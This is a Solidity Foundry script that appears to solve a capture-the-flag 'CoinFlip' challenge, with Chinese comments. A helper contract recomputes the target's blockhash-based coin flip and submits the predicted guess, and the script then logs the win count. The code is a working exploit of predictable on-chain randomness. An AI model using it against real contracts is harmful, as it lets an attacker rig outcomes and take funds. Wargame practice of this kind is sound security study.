// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address coinflip = vm.envAddress("COINFLIP_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));
        
        new Player(coinflip);
        
        // 檢查猜對次數
        (bool suc, bytes memory data) = coinflip.call(abi.encodeWithSignature("consecutiveWins()"));
        console.logBytes(data); // 輸出 `consecutiveWins`

        vm.stopBroadcast();
    }
}


contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address instance) {
        // 直接照抄題目的演算法即可
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        instance.call(abi.encodeWithSignature("flip(bool)", side)); // 作答
    }

}